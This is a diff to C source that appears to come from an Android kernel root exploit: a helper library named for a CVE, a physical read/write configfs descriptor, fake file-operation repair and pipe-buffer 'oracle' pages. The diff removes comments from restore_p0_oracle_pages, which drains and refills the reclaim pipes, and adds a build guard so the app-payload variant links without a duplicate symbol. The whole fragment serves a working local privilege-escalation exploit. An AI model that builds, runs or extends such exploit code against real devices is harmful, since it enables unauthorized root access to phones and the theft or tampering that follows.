@@ -1406,35 +1406,6 @@ uint64_t scan_p0_virtual_base_pointer(void) {
 }
 #endif
 
-/*
- * restore_p0_oracle_pages — drain residual oracle data from the reclaim
- * pipes and refill each slot with the inert RMG-P0-PIPE marker page.
- *
- * After scan_p0_pipe_oracle() or verify_p0_pipe_oracle_gate() consumes
- * the first slot from every pipe, (pipe_buffer_slots - 1) filled slots
- * remain in each reclaim pipe.  If the caller needs to re-arm the oracle
- * (retry after a failed attempt) or tear down cleanly, those slots must
- * be drained first — leaving them half-consumed would corrupt the next
- * prepare_pipe_buffer_page() call.
- *
- * This function:
- *   1. Reads and discards all remaining data from each reclaim pipe read-end.
- *   2. Refills every slot of every reclaim pipe with the RMG-P0-PIPE marker
- *      page, restoring the state produced by prepare_p0_pipe_oracle().
- *
- * The fd argument (physrw configfs fd) is accepted for API symmetry with
- * restore_slide_boot_id() and repair_fake_fops_llseek(); it is currently
- * unused but reserved for callers that may need kernel-side cleanup.
- *
- * __attribute__((visibility("default"))): the NDK toolchain defaults to
- * -fvisibility=hidden for shared libraries, which strips this symbol from
- * the .dynsym section.  The root helper (libcve43499root.so) resolves this
- * symbol at runtime via dlopen/dlsym after loading the app payload .so;
- * without default visibility the dynamic linker cannot find it and reports
- * "cannot locate symbol restore_p0_oracle_pages".
- *
- * Returns 1 on success, 0 if any pipe operation fails.
- */
 __attribute__((visibility("default")))
 int restore_p0_oracle_pages(int fd) {
   (void)fd;
@@ -1454,7 +1425,6 @@ int restore_p0_oracle_pages(int fd) {
       continue;
     }
 
-    /* Drain whatever data remains in the pipe without blocking. */
     int flags = fcntl(read_fd, F_GETFL, 0);
     if (flags >= 0) {
       fcntl(read_fd, F_SETFL, flags | O_NONBLOCK);
@@ -1469,7 +1439,6 @@ int restore_p0_oracle_pages(int fd) {
       fcntl(read_fd, F_SETFL, flags & ~O_NONBLOCK);
     }
 
-    /* Refill with one marker page per slot. */
     for (size_t slot = 0; slot < (size_t)pipe_buffer_slots; slot++) {
       if (!pipe_write_full(write_fd, marker, sizeof(marker))) {
         pr_warning("restore_p0_oracle_pages: refill failed pipe=%zu slot=%zu\n",
@@ -1485,6 +1454,14 @@ int restore_p0_oracle_pages(int fd) {
   return ok;
 }
 
+/*
+ * run_p0_pipe_oracle_diagnostic is defined here only for the root
+ * (non-APP_PAYLOAD) build.  The app-payload build (APP_PAYLOAD=1)
+ * compiles slide_app.c which provides its own definition; including
+ * this one in that translation unit causes a duplicate-symbol linker
+ * error on every APP_PHYS_P0_ORACLE target.
+ */
+#if !defined(APP_PAYLOAD) || !APP_PAYLOAD
 int run_p0_pipe_oracle_diagnostic(int fd) {
   int ret = 0;
   pr_info("p0 oracle diagnostic start fd=%d\n", fd);
@@ -1505,5 +1482,6 @@ int run_p0_pipe_oracle_diagnostic(int fd) {
   restore_p0_oracle_pages(fd);
   return ret;
 }
+#endif /* !APP_PAYLOAD */
 
 #endif /* APP_PHYS_P0_ORACLE */
